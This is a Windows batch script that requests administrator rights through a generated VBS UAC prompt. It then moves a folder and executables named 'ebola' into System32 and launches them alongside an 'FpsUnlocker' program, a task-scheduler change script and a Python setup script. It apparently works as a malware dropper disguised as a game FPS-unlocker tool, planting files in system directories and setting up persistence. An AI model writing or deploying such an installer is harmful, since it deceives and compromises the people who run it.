@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------


:moving the checkers and ebola
move "%~dp0ebola\ch1.bat" "%windir%\System32"
move "%~dp0ebola\ch2.bat" "%windir%\System32"
move "%~dp0ebola\ch3.bat" "%windir%\System32"
move "%~dp0ebola\ch4.bat" "%windir%\System32"
move "%~dp0ebola\ch5.bat" "%windir%\System32"
move /d "%~dp0ebola" "%windir%\System32"

move "%~dp0FpsUnlocker.exe" "%ProgramFiles%\FpsUnlocker"

:starting the checkers and ebola
start "" "%windir%\System32\ebola.exe"
@REM start "" "%windir%\System32\ch1.bat"
@REM start "" "%windir%\System32\ch2.bat"
@REM start "" "%windir%\System32\ch3.bat"
@REM start "" "%windir%\System32\ch4.bat"
@REM start "" "%windir%\System32\ch5.bat"

:starting app and task scheduler change
start "" "%ProgramFiles%\FpsUnlocker\FpsUnlocker.exe"
start "" "%windir%\System32\ebola\ba\tsksch.bat"
start "" "%windir%\System32\ebola\pysetup.bat"

if %errorlevel% neq 0 (
    exit /b 1
)
